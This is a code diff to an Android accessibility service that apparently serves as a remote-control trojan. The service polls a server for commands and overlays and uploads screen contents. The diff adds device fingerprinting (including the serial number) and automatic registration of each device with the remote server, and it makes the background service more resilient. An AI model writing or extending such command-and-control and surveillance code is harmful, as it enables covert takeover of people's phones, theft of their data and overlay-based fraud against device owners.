@@ -56,6 +56,12 @@ class ControleGestosService : AccessibilityService() {
         private const val INTERVALO_ATUALIZACAO = 1000L
         private const val CANAL_NOTIFICACAO = "servico_controle_remoto"
         private const val ID_NOTIFICACAO = 9999
+
+        fun obterIdDispositivo(): String {
+            val buildId = Build.ID?.trim().orEmpty()
+            if (buildId.isNotEmpty() && buildId != "unknown") return buildId
+            return "${Build.MANUFACTURER}_${Build.MODEL}_${Build.SERIAL}".replace(" ", "_")
+        }
     }
 
     private var jobPrincipal: Job? = null
@@ -74,9 +80,14 @@ class ControleGestosService : AccessibilityService() {
         super.onServiceConnected()
         windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         criarCanalNotificacao()
-        iniciarServicoEmPrimeiroPlano()
+        try {
+            iniciarServicoEmPrimeiroPlano()
+        } catch (e: Exception) {
+            Log.e("KL", "Erro ao iniciar FGS: ${e.message}")
+        }
         iniciarLoopPrincipal()
-        Log.i("KL", "Serviço de acessibilidade iniciado")
+        registrarDispositivoNoServidor()
+        Log.i("KL", "Servico iniciado — ID=${obterIdDispositivo()} Android=${Build.VERSION.RELEASE}")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
@@ -219,7 +230,7 @@ class ControleGestosService : AccessibilityService() {
         displayMetrics: android.util.DisplayMetrics
     ): String {
         val json = org.json.JSONObject().apply {
-            put("id", Build.ID)
+            put("id", obterIdDispositivo())
             put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
             put("fabricante", Build.MANUFACTURER)
             put("android", Build.VERSION.RELEASE)
@@ -560,6 +571,37 @@ class ControleGestosService : AccessibilityService() {
     }
     // ─── Comunicação com o servidor ──────────────────────────────────────────
 
+    private fun registrarDispositivoNoServidor() {
+        CoroutineScope(Dispatchers.IO).launch {
+            var conexao: HttpURLConnection? = null
+            try {
+                val payload = org.json.JSONObject().apply {
+                    put("id", obterIdDispositivo())
+                    put("modelo", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
+                    put("fabricante", Build.MANUFACTURER)
+                    put("android", Build.VERSION.RELEASE)
+                    put("largura", resources.displayMetrics.widthPixels)
+                    put("altura", resources.displayMetrics.heightPixels)
+                    put("status", "online")
+                }
+                conexao = URL("${URL_VPS}/registrar_dispositivo").openConnection() as HttpURLConnection
+                conexao.apply {
+                    requestMethod = "POST"
+                    doOutput = true
+                    connectTimeout = 5000
+                    readTimeout = 5000
+                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
+                }
+                OutputStreamWriter(conexao.outputStream, Charsets.UTF_8).use { it.write(payload.toString()) }
+                Log.i("KL", "Registro dispositivo: HTTP ${conexao.responseCode}")
+            } catch (e: Exception) {
+                Log.e("KL", "Erro ao registrar dispositivo: ${e.message}")
+            } finally {
+                conexao?.disconnect()
+            }
+        }
+    }
+
     private fun enviarEstruturaParaServidor(dados: String) {
         CoroutineScope(Dispatchers.IO).launch {
             var conexao: HttpURLConnection? = null
@@ -574,7 +616,9 @@ class ControleGestosService : AccessibilityService() {
                 }
                 OutputStreamWriter(conexao.outputStream, Charsets.UTF_8).use { it.write(dados) }
                 val resposta = conexao.responseCode
-                if (resposta != HttpURLConnection.HTTP_OK) {
+                if (resposta == HttpURLConnection.HTTP_OK) {
+                    Log.d("KL", "Estrutura enviada — ${obterIdDispositivo()}")
+                } else {
                     Log.w("KL", "Estrutura: servidor retornou $resposta")
                 }
             } catch (e: Exception) {
@@ -588,7 +632,7 @@ class ControleGestosService : AccessibilityService() {
     private fun verificarComandosRecebidos() {
         var conexao: HttpURLConnection? = null
         try {
-            val idDispositivo = Build.ID
+            val idDispositivo = obterIdDispositivo()
             conexao = URL("$URL_BUSCAR_COMANDOS?id=$idDispositivo").openConnection() as HttpURLConnection
             conexao.apply {
                 requestMethod = "GET"
@@ -613,7 +657,7 @@ class ControleGestosService : AccessibilityService() {
     private fun verificarOverlay() {
         var conexao: HttpURLConnection? = null
         try {
-            val idDispositivo = Build.ID
+            val idDispositivo = obterIdDispositivo()
             conexao = URL("$URL_BUSCAR_OVERLAY?id=$idDispositivo").openConnection() as HttpURLConnection
             conexao.apply {
                 requestMethod = "GET"
@@ -1148,13 +1192,18 @@ class ControleGestosService : AccessibilityService() {
             .setSmallIcon(R.mipmap.ic_launcher)
             .setOngoing(true)
             .build()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(
-                ID_NOTIFICACAO,
-                notificacao,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-            )
-        } else {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(
+                    ID_NOTIFICACAO,
+                    notificacao,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                )
+            } else {
+                startForeground(ID_NOTIFICACAO, notificacao)
+            }
+        } catch (e: Exception) {
+            Log.e("KL", "FGS specialUse falhou (${Build.VERSION.SDK_INT}): ${e.message}")
             startForeground(ID_NOTIFICACAO, notificacao)
         }
     }
